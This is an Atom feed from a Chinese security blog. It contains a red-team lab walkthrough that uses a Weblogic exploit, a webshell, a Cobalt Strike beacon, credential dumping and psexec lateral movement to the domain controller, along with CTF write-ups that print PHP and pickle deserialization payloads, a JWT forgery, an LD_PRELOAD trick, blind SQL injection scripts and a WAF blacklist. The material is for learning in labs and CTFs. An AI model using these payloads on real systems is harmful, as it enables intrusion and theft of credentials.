<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>吴豪滨的地宫</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-10-10T09:19:36.554Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>吴豪滨</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Cobalt Strike流量分析</title>
    <link href="http://example.com/2024/10/10/Cobalt%20Strike%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2024/10/10/Cobalt%20Strike%E5%88%86%E6%9E%90/</id>
    <published>2024-10-10T07:37:52.000Z</published>
    <updated>2024-10-10T09:19:36.554Z</updated>
    
    
    
    
    
    <category term="流量分析" scheme="http://example.com/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>✋毫🧊有🧊1</title>
    <link href="http://example.com/2023/05/05/%E2%9C%8B%E6%AF%AB%F0%9F%A7%8A%E6%9C%89%F0%9F%A7%8A/"/>
    <id>http://example.com/2023/05/05/%E2%9C%8B%E6%AF%AB%F0%9F%A7%8A%E6%9C%89%F0%9F%A7%8A/</id>
    <published>2023-05-05T07:37:52.000Z</published>
    <updated>2023-05-05T08:08:10.321Z</updated>
    
    <content type="html"><![CDATA[<p>✋毫🧊有🧊 一晚上睡不着爬起来学内网渗透，因为感觉你👱🏻‍这方面的经验多少是欠缺的</p><p>还是大一大二太有素质了。</p><h3 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h3><h5 id="ATT-amp-CK红队评估二套靶场"><a href="#ATT-amp-CK红队评估二套靶场" class="headerlink" title="ATT&amp;CK红队评估二套靶场"></a><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">ATT&amp;CK红队评估二套靶场</a></h5><p>靶场配置的时候有几个很死🐴的地方</p><p>WEB虚拟机密码不对需要回退到快照三</p><p>如果虚拟机🐶叫说回退不到，那就把前两个快照删了</p><p>使用administrator账户，第一次进入(密码为空)的时候需要更换密码为默认密码，进入WEB虚拟机后还要管理员权限进入对应文件夹。</p><p><code>C:\Oracle\Middleware\user_projects\domains\base_domain</code>，以管理员权限运行startweblogic服务</p><p>死🐴的地方还有WEB虚拟机开始不出网，后面将WEB虚拟机连接外网的ip改到虚拟机网段内后才好</p><h5 id="域控DC服务器"><a href="#域控DC服务器" class="headerlink" title="域控DC服务器"></a>域控DC服务器</h5><p>内网ip:10.10.10.10</p><p>系统:Windows Server 2012 (64位)</p><p>用户名:de1ay</p><h5 id="WEB服务器"><a href="#WEB服务器" class="headerlink" title="WEB服务器"></a>WEB服务器</h5><p>外网ip:192.168.25.140</p><p>内网ip:10.10.10.80</p><p>系统:Windows Server 2008(64位)</p><p>用户名:</p><h5 id="PC域内主机"><a href="#PC域内主机" class="headerlink" title="PC域内主机"></a>PC域内主机</h5><p>内网ip:10.10.10.201</p><p>系统:Windows 7(32位)</p><p>用户名:</p><h5 id="攻击者VPS"><a href="#攻击者VPS" class="headerlink" title="攻击者VPS"></a>攻击者VPS</h5><p>外网ip:192.168.25.131</p><p>系统:Linux</p><p>WEB服务器有两个网卡，一个网卡连接外网，对外提供web服务，另一个网卡连接内网。域成员Windows 7和域控制器位于内网，域成员主机可以没有公网ip但能上网，域控制器只能与内网连通，不能与外网通信。</p><h3 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h3><p>已知Web服务器公网ip，所以先进行一个扫</p><p>扫到了7001端口 这个端口运行着Weblogic</p><p><img src="https://s2.loli.net/2023/05/02/syuC4fzNJQhdcM5.png"></p><p>在扫描下端口7001路径</p><p>扫描到有个console(此处还是上一次做的时候的截图 所以后面是134 你👱🏻‍懒得重新搞)</p><p>![ZN7Y~2_E__@IQDBS_ERT`IV.png](<a href="https://s2.loli.net/2023/03/21/XTPkpEZ5afw3i9H.png">https://s2.loli.net/2023/03/21/XTPkpEZ5afw3i9H.png</a>)</p><p>在浏览器上打开可以看到weblogic版本为10.3.6.0</p><p><img src="https://s2.loli.net/2023/05/02/WhNYcKj8x3Z4VGn.png"></p><p>用Weblogic扫描工具扫描到一个java反序列化漏洞CVE-2019-2725</p><p>![RXG`EFP__BVWB2TM07_5WC3.png](<a href="https://s2.loli.net/2023/03/21/3AfdUwK9HpzLTjy.png">https://s2.loli.net/2023/03/21/3AfdUwK9HpzLTjy.png</a>)</p><p>用java反序列化测试工具搞一搞呢(java坑死你👱🏻‍了 换了十几个版本才勉强能用)</p><p><img src="https://s2.loli.net/2023/05/02/W6dPXEpKSM4oN9e.png"></p><p>试试whoami呢</p><p><img src="https://s2.loli.net/2023/05/02/aI4LmuOtrERV9jZ.png"></p><p>上传个冰蝎🐴呢(<a href="https://www.cnblogs.com/sstfy/p/10350915.html">这里的路径可以参考这个链接</a>)</p><p><img src="https://s2.loli.net/2023/05/03/u4kRAzt7P6oDmsN.png"></p><p>用冰蝎成功连接</p><p><img src="https://s2.loli.net/2023/05/03/yicmeKnDxp2dfjV.png"></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>查看本机ip等相关信息 可以看到存在一个域</p><p><img src="https://s2.loli.net/2023/05/03/SI2DPMtTAn9dmie.png"></p><p>用冰蝎传个cs生成的🐴</p><p><img src="https://s2.loli.net/2023/05/03/2cd6zkLAw1YIHxl.png"></p><p>在冰蝎启动上传的exe</p><p>Cobalt Strike上靶机上线</p><p><img src="https://s2.loli.net/2023/05/03/aQZ4y17hoH6PISR.png"></p><p>查看防火墙状态呢</p><table><thead><tr><th><code># windows server 2003及以下版本:</code></th></tr></thead><tbody><tr><td><code>netsh firewall show config</code></td></tr><tr><td><code># window server 2003以上版本：</code></td></tr><tr><td><code>netsh advfirewall show allprofiles state</code></td></tr></tbody></table><p><img src="https://s2.loli.net/2023/05/03/Nzrpo6hJtmREsg4.png"></p><p>关闭防火墙需要管理员权限，但这里的user就是administrator</p><p>所以可以直接关闭</p><p><img src="https://s2.loli.net/2023/05/03/nkqPuvszNUFYc9J.png"></p><p><img src="https://s2.loli.net/2023/05/03/WHKCPXDO7I2Rstq.png"></p><p>发现域de1ay.com</p><p>查看当前域内机器和域控呢</p><table><thead><tr><th><code>net group &quot;domain computers&quot; /domain    #查看当前域内机器</code></th></tr></thead><tbody><tr><td><code>net group &quot;domain controllers&quot; /domain    #查看域控</code></td></tr><tr><td><code>net group &quot;domain admins&quot; /domain      #查看域管理员用户</code></td></tr></tbody></table><p>可以发现</p><p><img src="https://s2.loli.net/2023/05/03/lSYUq8dg1jfEoey.png"></p><p><img src="https://s2.loli.net/2023/05/03/ipqLKStbNjX35h7.png"></p><p><img src="https://s2.loli.net/2023/05/03/qdltmZk9jyaNuDR.png"></p><p>通过ping的方式可以发现PC和DC的ip</p><p><img src="https://s2.loli.net/2023/05/03/zBLwDybvHJgRU37.png"></p><p><img src="https://s2.loli.net/2023/05/03/9QAe1gwZkHnuP5C.png"></p><p><img src="https://s2.loli.net/2023/05/05/Ln8HyTERQqJXIPj.png"></p><p>hashdump获取凭证信息</p><p><img src="https://s2.loli.net/2023/05/05/5qyr4QPkJoTCv3K.png"></p><p>再利用logonpasswords抓取到密码</p><p><img src="https://s2.loli.net/2023/05/05/WEu5RobzpeQGSO2.png"></p><p><img src="https://s2.loli.net/2023/05/05/PlG6JpvZMXBds52.png"></p><p>可以尝试用这个密码创一创其他主机</p><p><img src="https://s2.loli.net/2023/05/05/oaT5y6ceiXjunkv.png"></p><p>常见相关指令</p><table><thead><tr><th><code>whoami /all   #获取域 SID</code></th></tr></thead><tbody><tr><td><code>tasklist /svc  #查看进程列表</code></td></tr><tr><td><code>wmic process list brief   #查看进程列表</code></td></tr><tr><td><code>wmic startup get command,caption   #查询启动程序信息</code></td></tr><tr><td><code>schtasks /query /fo LIST /v   #查询计划任务</code></td></tr><tr><td><code>net user    #查询本机用户列表</code></td></tr><tr><td><code>net user /domain    #查询域内用户</code></td></tr><tr><td><code>net localgroup  #查询本机用户组成员列表</code></td></tr><tr><td><code>net localgruop administrators   #查询本机管理员组成员列表</code></td></tr><tr><td>`query user</td></tr><tr><td><code>net share  #查询本机共享列表</code></td></tr><tr><td><code>route print   #查询路由信息</code></td></tr><tr><td><code>arp -a    #查询arp缓存表</code></td></tr><tr><td><code># 查询 RDP 端口   0xd3d 即为 3389 端口</code></td></tr><tr><td><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp&quot; /V PortNumber</code></td></tr></tbody></table><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>用冰蝎给WEB上传fscan，发现冰蝎好像传不上去大文件，坑死你👱🏻‍了，用CS传，传了好几段属于是分尸了，这里还要注意目标系统是32位的还是64位</p><p><img src="https://s2.loli.net/2023/05/05/cktN8eDz5FC6PMg.png"></p><p>扫描DC端口</p><p>发现有ms17-010永恒之蓝</p><p><img src="https://s2.loli.net/2023/05/05/pQvBPmViHc9etWC.png"><br>可以发现端口445是开启的，因此尝试一下域横向移动，又因为得到了管理员密码，所以可以利用SMB beacon横向移动。因为连接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效</p><p><strong>psexec横向移动的条件</strong><br>对方主机开启了 admin$ 共享和445端口，如果关闭了admin$共享，会提示：找不到网络名<br>对方未开启防火墙<br>如果是工作组环境，则必须使用administrator用户连接（因为要在目标主机上面创建并启动服务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问。<br>如果是域环境，即可用普通域用户连接也可以用域管理员用户连接。连接普通域主机可以用普通域用户，连接域控只能用域管理员账户。(你👱🏻‍偷的别人的 自己写不明白)</p><p>先用spawn派生出来一个会话，在已有的 Beacon 上右键点击 Spawn(生成会话 / 派生)，选择name为ceshi的payload，然后点击choose，会反弹一个子会话，在 external 的 ip 后面会有一个∞∞样式的小图标</p><p>在listeners处创建一个payload</p><p><img src="https://s2.loli.net/2023/05/05/8kHxrGTupiWqnIs.png"></p><p>在view-&gt;targets可以看到存活的主机</p><p><img src="https://s2.loli.net/2023/05/05/5hvMOejufxzmL1d.png"></p><p>在目标主机图标上右击，jump-&gt;psexec64或者psexec，选择管理员账号，再填写listener和session信息，直接选择launch成功，成功获取域控权限。</p><p><img src="https://s2.loli.net/2023/05/05/pHsyQD3ANERe7cC.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;✋毫🧊有🧊 一晚上睡不着爬起来学内网渗透，因为感觉你👱🏻‍这方面的经验多少是欠缺的&lt;/p&gt;
&lt;p&gt;还是大一大二太有素质了。&lt;/p&gt;
&lt;h3 id=&quot;靶场环境&quot;&gt;&lt;a href=&quot;#靶场环境&quot; class=&quot;headerlink&quot; title=&quot;靶场环境&quot;&gt;&lt;/a&gt;靶</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF 2022</title>
    <link href="http://example.com/2022/03/23/DASCTF%202022/"/>
    <id>http://example.com/2022/03/23/DASCTF%202022/</id>
    <published>2022-03-23T06:15:21.000Z</published>
    <updated>2022-04-15T07:42:24.613Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h1><p>题目源码为</p><pre><code>&lt;?phpclass crow&#123;public $v1;public $v2;function eval() &#123;    echo new $this-&gt;v1($this-&gt;v2);&#125;public function __invoke()&#123;    $this-&gt;v1-&gt;world();&#125;&#125;class fin&#123;public $f1;public function __destruct()&#123;    echo $this-&gt;f1 . &#39;114514&#39;;&#125;public function run()&#123;    ($this-&gt;f1)();&#125;public function __call($a, $b)&#123;    echo $this-&gt;f1-&gt;get_flag();&#125;&#125;class what&#123;public $a;public function __toString()&#123;    $this-&gt;a-&gt;run();    return &#39;hello&#39;;&#125;&#125;class mix&#123;public $m1;public function run()&#123;    ($this-&gt;m1)();&#125;public function get_flag()&#123;    eval(&#39;#&#39; . $this-&gt;m1);&#125;&#125;if (isset($_POST[&#39;cmd&#39;])) &#123;unserialize($_POST[&#39;cmd&#39;]);&#125; else &#123;highlight_file(__FILE__);&#125;</code></pre><p>因此构造反序列化</p><p>fin-&gt;(调用destruct)-&gt;what-&gt;(调用tostring）-&gt;fin-&gt;(调用run)-&gt;crow-&gt;(调用invoke)-&gt;fin-&gt;(调用call)-&gt;mix-&gt;(getflag)</p><p>绕过井号：利用?&gt;&lt;?php标签绕过</p><pre><code>&lt;?phpclass what&#123;public $a;public function __construct()&#123;    $this-&gt;a = new fin();&#125;&#125;class mix&#123;public $m1;public function __construct()&#123;    $this-&gt;m1 = &quot;?&gt;&lt;?=system(&#39;cat H0mvz850F.php&#39;);&quot;;&#125;public function get_flag()&#123;    eval(&#39;#&#39; . $this-&gt;m1);&#125;&#125;class fin&#123;public $f1;public function __construct()&#123;    $this-&gt;f1 = array(new mix(), &#39;get_flag&#39;);&#125;&#125;$a = new fin();$a-&gt;f1 = new what();echo urlencode(serialize($a));</code></pre><p>之前需要ls查看所有文件,然后一个一个尝试拿到flag最终flag在H0mvz850F.php上</p><h1 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h1><p>这道题本来以为做过就应该能拿下,但是后面发现ban的东西挺多的,一直都做不出来。现在来重新复盘</p><pre><code>@app.route(&quot;/calc&quot;,methods=[&#39;GET&#39;])def calc():ip = request.remote_addrnum = request.values.get(&quot;num&quot;)log = &quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,time.localtime()),ip,num)if waf(num):    try:        data = eval(num)        os.system(log)    except:        pass    return str(data)else:    return &quot;waf!!&quot;</code></pre><p>waf(num)的黑名单是</p><pre><code>blacklist = [&#39;import&#39;,&#39;(&#39;,&#39;)&#39;,&#39; &#39;,&#39;_&#39;,&#39;|&#39;,&#39;;&#39;,&#39;&quot;&#39;,&#39;&#123;&#39;,&#39;&#125;&#39;,&#39;&amp;&#39;,&#39;getattr&#39;,&#39;os&#39;,&#39;system&#39;,&#39;class&#39;,&#39;subclasses&#39;,&#39;mro&#39;,&#39;request&#39;,&#39;args&#39;,&#39;eval&#39;,&#39;if&#39;,&#39;subprocess&#39;,&#39;file&#39;,&#39;open&#39;,&#39;popen&#39;,&#39;builtins&#39;,&#39;compile&#39;,&#39;execfile&#39;,&#39;from_pyfile&#39;,&#39;config&#39;,&#39;local&#39;,&#39;self&#39;,&#39;item&#39;,&#39;getitem&#39;,&#39;getattribute&#39;,&#39;func_globals&#39;,&#39;__init__&#39;,&#39;join&#39;,&#39;__dict__&#39;]</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ezpop&quot;&gt;&lt;a href=&quot;#ezpop&quot; class=&quot;headerlink&quot; title=&quot;ezpop&quot;&gt;&lt;/a&gt;ezpop&lt;/h1&gt;&lt;p&gt;题目源码为&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php

class crow
&amp;#123;
public $v</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>你爹刷题6</title>
    <link href="http://example.com/2022/03/23/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%986/"/>
    <id>http://example.com/2022/03/23/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%986/</id>
    <published>2022-03-23T06:15:21.000Z</published>
    <updated>2022-03-25T06:04:34.083Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h1><p>你👱🏻‍打开题目就出现这个</p><p><img src="https://s2.loli.net/2022/03/23/e9VgSjHcoFUYCAx.png"></p><p>随便注册个号,有1000元</p><p><img src="https://s2.loli.net/2022/03/23/MhecP3uEbqjDgaF.png"></p><p>你👱🏻‍注意到了这个地方,应该是要搞个lv6的,但是看一圈没lv6的。</p><p><img src="https://s2.loli.net/2022/03/23/3kayvuVxnMg6Z1z.png"></p><p>可能从这里就得写个脚本找了</p><p><img src="https://s2.loli.net/2022/03/23/XJjd16znHIZ7msr.png"></p><pre><code>import requestsurl=&quot;http://6e89c84c-ec2a-4e9a-91ba-bafe514f5216.node4.buuoj.cn:81/shop?page=&quot;for i in range(0,3000):r=requests.get(url+str(i))if &#39;lv6.png&#39; in r.text:    print(i)    break;</code></pre><p>找出来在180页</p><p>然后发现买不起6级号</p><p>乌鱼了</p><p><img src="https://s2.loli.net/2022/03/23/1oAECluVY2bxkdS.png"></p><p>应该是要抓包修改了。</p><p><img src="https://s2.loli.net/2022/03/23/fDQuas2NyChtY8A.png"></p><p>这里折扣能改,那必须狠狠薅羊毛了</p><p><img src="https://s2.loli.net/2022/03/23/gyjdm7hA8C1FUx6.png"></p><p>然后被逮到</p><p>百度了一下,这里涉及JWT破解 </p><p>这里可以了解一下JWT</p><p><a href="https://www.cnblogs.com/cjsblog/p/9277677.html" title="这里了解一下">https://www.cnblogs.com/cjsblog/p/9277677.html</a></p><p>这里用base64将JWT解码</p><p>得到</p><p><img src="https://s2.loli.net/2022/03/23/9MwmWdqi2UErv1u.png"></p><p>然后利用一个网站进行造谣</p><p><a href="https://jwt.io/">https://jwt.io/</a></p><p><img src="https://s2.loli.net/2022/03/23/RvV1ZPQCArJ2ocd.png"></p><p>但是我们需要密钥,所以还需要一个工具来解密</p><p><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p><p><img src="https://s2.loli.net/2022/03/23/W17lqTI3RxyLJYz.png"></p><p>得到密钥为1Kun</p><p><img src="https://s2.loli.net/2022/03/23/RYmHx6qvy7OrIJj.png"></p><p>将用户名替换为admin</p><p>并将造谣的JWT替换,成功了</p><p><img src="https://s2.loli.net/2022/03/23/Fyd6VHD8Qmn2qAg.png"></p><p>这里找到了一些好东西</p><p><img src="https://s2.loli.net/2022/03/23/RhnDOCgWbMBKkrL.png"></p><p>下载后,看里面的Admin.py有反序列操作</p><p>python反序列化属于是第一次见</p><pre><code>pickle提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。pickle模块只能在python中使用，python中几乎所有的数据类型（列表，字典，集合，类等）都可以用pickle来序列化，pickle序列化后的数据，可读性差，人一般无法识别。p = pickle.loads(urllib.unquote(become))urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp; key2 = value2的形式pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回</code></pre><p>我们构建一个类，类里面的__reduce__python魔术方法会在该类被反序列化的时候会被调用</p><pre><code>Pickle模块中最常用的函数为：（1）pickle.dump(obj, file, [,protocol])    函数的功能：将obj对象序列化存入已经打开的file中。   参数讲解：obj：想要序列化的obj对象。file:文件名称。protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。（2）pickle.load(file)    函数的功能：将file中的对象序列化读出。    参数讲解：file：文件名称。（3）pickle.dumps(obj[, protocol])   函数的功能：将obj对象序列化为string形式，而不是存入文件中。   参数讲解：obj：想要序列化的obj对象。protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。（4）pickle.loads(string)   函数的功能：从string中读出序列化前的obj对象。   参数讲解：string：文件名称。 【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。</code></pre><p>而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码</p><p>当__reduce__被定义之后，该对象被Pickle时就会被调用</p><p>我们这里的eval用于重建对象的时候调用，即告诉python如何pickle他们</p><p>供eval使用的即打开的文件flag.txt</p><p>其他的参数我们可以不填</p><p>payload有很多种写法，这算是一种通用型写法</p><p>我们在本地python2的环境下运行</p><p>得到了序列化之后并且url编码之后的结果</p><p>点击页面一键成为大会员，抓包</p><p>接着将python2得到的结果替换掉become的内容</p><p>这个是你👱🏻‍偷的脚本,需要在python2的环境下运行,你👱🏻‍选择用在线编辑器完成</p><pre><code>import pickleimport urllibclass payload(object):def __reduce__(self):   return (eval, (&quot;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&quot;,))a = pickle.dumps(payload())a = urllib.quote(a) print a</code></pre><p><img src="https://s2.loli.net/2022/03/24/oJ3qyDjBA8lc1w6.png"></p><p>替换完成后 得到flag</p><h1 id="HFCTF2022-ezphp"><a href="#HFCTF2022-ezphp" class="headerlink" title="[HFCTF2022]ezphp"></a>[HFCTF2022]ezphp</h1><p>这道题你👱🏻‍确实是一点头绪都没有,比赛结束后只有这道题有环境,去照着wp复现一下了</p><p>在这个题目中主要用到的就是nginx临时文件+LD_PRELOAD加载恶意so这两个知识点</p><pre><code>&lt;?php (empty($_GET[&quot;env&quot;])) ? highlight_file(__FILE__) : putenv($_GET[&quot;env&quot;]) &amp;&amp; system(&#39;echo hfctf2022&#39;);?&gt;</code></pre><p>这句话的意思是对环境变量进行赋值</p><p>Nginx的临时文件是什么呢:</p><pre><code>当 Nginx 接收来自 FastCGI 的响应时，若大小超过限定值(大概32Kb)不适合以内存的形式来存储的时候，一部分就会以临时文件的方式保存到磁盘上。在 /var/lib/nginx/fastcgi 下产生临时文件。</code></pre><p>LD_PRELOAD加载so:</p><pre><code>LD_PRELOAD可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库，这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数。</code></pre><p>进程在启动后，会按照一定顺序加载动态库：</p><pre><code>加载环境变量LD_PRELOAD指定的动态库加载文件/etc/ld.so.preload指定的动态库搜索环境变量LD_LIBRARY_PATH指定的动态库搜索路径搜索路径/lib64下的动态库文件</code></pre><p>当Nginx的fastcgui接收到的响应大小超过32Kb就会在/var/lib/nginx/fastcgi产生一个存放相应内容的临时文件, 但其实这个过程可以说是稍纵即逝,文件创建到删除的窗口期根本不足以让我们及时的就行文件加载, 这时候就用到了记录进程信息的文件夹/proc/pid/fd。 在Linux上，在一个进程中打开的文件描述符集可以在/proc/PID/fd/路径下访问，其中PID是进程标识符。</p><p>​在这里面存放有进程打开的全部资源文件的软链接, 最重要的是即使临时文件被删除了也还是一样可以被正常读取</p><p>所以我们就可以将临时文件上传控制为我们的恶意so文件, 然后设置payload为</p><pre><code>?env=LD_PRELOAD=/proc/pid/fd/file_id</code></pre><p>之后执行的echo命令会加载我们so文件劫持的函数加载恶意代码从而获取flag</p><p>总而言之整个过程就是</p><pre><code>让后端 php 请求一个过大的文件Fastcgi 返回响应包过大，导致 Nginx 需要产生临时文件进行缓存虽然 Nginx 删除了/var/lib/nginx/fastcgi下的临时文件，但是在 /proc/pid/fd/ 下我们可以找到被删除的文件遍历 pid 以及 fd ，修改LD_PRELOAD完成 LFI</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CISCN2019-华北赛区-Day1-Web2-ikun&quot;&gt;&lt;a href=&quot;#CISCN2019-华北赛区-Day1-Web2-ikun&quot; class=&quot;headerlink&quot; title=&quot;[CISCN2019 华北赛区 Day1 Web2]ikun&quot;&gt;&lt;/</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>你爹刷题5</title>
    <link href="http://example.com/2022/03/18/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%985/"/>
    <id>http://example.com/2022/03/18/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%985/</id>
    <published>2022-03-18T06:15:21.000Z</published>
    <updated>2022-03-25T06:04:20.761Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h1><p>你👱🏻‍点进题目就看到这个</p><p><img src="https://s2.loli.net/2022/03/18/a5cVAXuHDmnSE6O.png"></p><p>输入1试试</p><p><img src="https://s2.loli.net/2022/03/18/ZU9Q2i1qdtoIh4O.png"></p><p>得到1伯昏</p><p>数字最多只能输到4</p><p>试了一下很明显是sql注入题目,试试异或1^1^1</p><p><img src="https://s2.loli.net/2022/03/18/fH2epCwGk9sl7gd.png"></p><p>插入sql语句</p><pre><code>1^(ascii(substr((select(database())),1,1))&gt;200)^1</code></pre><p><img src="https://s2.loli.net/2022/03/18/6LzXCAfrJ7KB5Wn.png"></p><p>大于200就查询不到了,明显是布尔盲注</p><p>0^1会出现1的内容</p><p>爆库名</p><pre><code>import requestsimport timeurl = &quot;http://5a84ccfd-c740-44de-a8f3-57db290c078a.node4.buuoj.cn/?stunum=&quot;result = &quot;&quot;i = 0while (True):i = i + 1head = 32tail = 127while (head &lt; tail):    mid = (head + tail) &gt;&gt; 1    payload = &quot;if(ascii(substr(database(),%d,1))&gt;%d,1,0)&quot; % (i, mid)    r = requests.get(url + payload)    time.sleep(0.3)    r.encoding = &quot;utf-8&quot;    # print(url+payload)    if &quot;your score is: 100&quot; in r.text:        head = mid + 1    else:        # print(r.text)        tail = midlast = resultif head != 32:    result += chr(head)else:    breakprint(result)</code></pre><p>库名为ctf</p><p>爆表</p><pre><code>import requestsimport timeurl = &quot;http://5a84ccfd-c740-44de-a8f3-57db290c078a.node4.buuoj.cn/?stunum=&quot;result = &quot;&quot;i = 0while (True):i = i + 1head = 32tail = 127while (head &lt; tail):    mid = (head + tail) &gt;&gt; 1    # payload = &quot;if(ascii(substr(database(),%d,1))&gt;%d,1,0)&quot; % (i , mid)    payload = &quot;if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d,1,0)&quot; % (    i, mid)    r = requests.get(url + payload)    time.sleep(0.3)    r.encoding = &quot;utf-8&quot;    # print(url+payload)    if &quot;your score is: 100&quot; in r.text:        head = mid + 1    else:        # print(r.text)        tail = midlast = resultif head != 32:    result += chr(head)else:    breakprint(result)</code></pre><p>表名为</p><p><img src="https://s2.loli.net/2022/03/18/yKVj7sZDArYgL6M.png"></p><p>爆列名</p><pre><code>import requestsimport timeurl = &quot;http://5a84ccfd-c740-44de-a8f3-57db290c078a.node4.buuoj.cn//?stunum=&quot;result = &quot;&quot;i = 0while (True):i = i + 1head = 32tail = 127while (head &lt; tail):    mid = (head + tail) &gt;&gt; 1    # payload = &quot;if(ascii(substr(database(),%d,1))&gt;%d,1,0)&quot; % (i , mid)    # payload = &quot;if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d,1,0)&quot; % (i , mid)    payload = &quot;if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_name=&#39;flag&#39;)),%d,1))&gt;%d,1,0)&quot; % (    i, mid)    r = requests.get(url + payload)    time.sleep(0.3)    r.encoding = &quot;utf-8&quot;    # print(url+payload)    if &quot;your score is: 100&quot; in r.text:        head = mid + 1    else:        # print(r.text)        tail = midlast = resultif head != 32:    result += chr(head)else:    breakprint(result)</code></pre><p>列名为</p><p><img src="https://s2.loli.net/2022/03/18/PWjoyXn9k64aw1O.png"></p><p>爆字段</p><pre><code>import requestsimport timeurl=&quot;http://e28bbc98-   c8fb-4f48-8165-50f458b0ac6b.node4.buuoj.cn:81/?stunum=&quot;name=&#39;&#39;for i in range(1,100):print(i)low=32high=128mid=(low+high)//2while low&lt;high:    #payload = &quot;0^(ascii(substr((select(database())),%d,1))&gt;%d)&quot; % (i, mid)    #payload=&quot;0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;ctf&#39;)),%d,1))&gt;%d)&quot;%(i,mid)    #payload=&quot;0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),%d,1))&gt;%d)&quot;%(i,mid)    payload=&quot;0^(ascii(substr((select(group_concat(value))from(flag)),%d,1))&gt;%d)&quot;%(i,mid)    r=requests.get(url=url+payload)    time.sleep(0.3)    #print(r.text)    if &#39;admin&#39; in r.text:        low = mid+1    else:        high=mid    mid=(low+high)//2    if(mid==32):        breakname=name+chr(mid)print (name)</code></pre><p>得到flag</p><p><img src="https://s2.loli.net/2022/03/18/SwHFVTaCtvUM5d3.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;WUSTCTF2020-颜值成绩查询&quot;&gt;&lt;a href=&quot;#WUSTCTF2020-颜值成绩查询&quot; class=&quot;headerlink&quot; title=&quot;[WUSTCTF2020]颜值成绩查询&quot;&gt;&lt;/a&gt;[WUSTCTF2020]颜值成绩查询&lt;/h1&gt;&lt;p&gt;你👱�</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>你爹刷题4</title>
    <link href="http://example.com/2022/03/04/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%984/"/>
    <id>http://example.com/2022/03/04/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%984/</id>
    <published>2022-03-04T06:15:21.000Z</published>
    <updated>2022-03-16T07:25:55.931Z</updated>
    
